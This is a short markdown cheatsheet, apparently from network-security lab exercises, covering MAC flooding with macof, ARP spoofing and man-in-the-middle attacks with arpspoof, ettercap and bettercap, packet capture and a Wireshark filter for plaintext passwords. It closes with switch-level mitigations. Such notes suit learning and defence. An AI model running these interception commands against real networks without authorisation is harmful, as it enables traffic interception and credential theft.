# Cheatsheet — Commands, Filters & Mitigation


## Quick commands
- Show interfaces: `ip a`
- Show ARP table: `ip neigh` or `arp -n`
- Discover hosts: `sudo arp-scan -l` or `sudo nmap -sn 10.10.0.0/24`


### MAC Flooding
- Install: `sudo apt update && sudo apt install dsniff` (macof is in dsniff)
- Run flood: `sudo macof -i <iface>`
- Stop: `pkill macof`


### ARP Spoofing / MITM
- Enable IP forward: `sudo sysctl -w net.ipv4.ip_forward=1`
- arpspoof (dsniff):
- `sudo arpspoof -i <iface> -t <victim-ip> <gateway-ip>`
- `sudo arpspoof -i <iface> -t <gateway-ip> <victim-ip>`
- Ettercap (text mode): `sudo ettercap -T -M arp:remote /<victim-ip>/ /<gateway-ip>/`
- Bettercap (modern): `sudo bettercap -iface <iface>` then in prompt: `net.probe on`, `arp.spoof on`


### Capture
- tcpdump to file: `sudo tcpdump -i <iface> -w capture.pcap`
- tail live packets: `sudo tcpdump -i <iface] -n -vv`
- Wireshark display filters:
- ARP: `arp`
- HTTP: `http`
- IP: `ip.addr == 10.10.20.15`
- TCP port 80: `tcp.port == 80`


## Wireshark useful filters
- `arp.opcode == 2` — ARP replies
- `eth.addr == aa:bb:cc:dd:ee:ff` — filter by MAC
- `http contains "password"` — search HTTP bodies for "password"


## Signs of successful ARP spoofing
- `arp -n` on victim shows your attacker's MAC for the gateway IP
- You see traffic from victim when previously you could not (post MAC flood)
- ARP replies with conflicting MAC addresses observed in capture


## Mitigation & defence
- Port security on switches (limit number of MACs per port)
- Dynamic ARP Inspection (DAI) and DHCP snooping
- Use static ARP entries for critical servers
- Use encrypted protocols: HTTPS, SSH, TLS to limit useful plaintext capture


## References
- `macof` and `dsniff` manual pages
- `ettercap` and `bettercap` docs
- TryHackMe room walkthroughs and network fundamentals
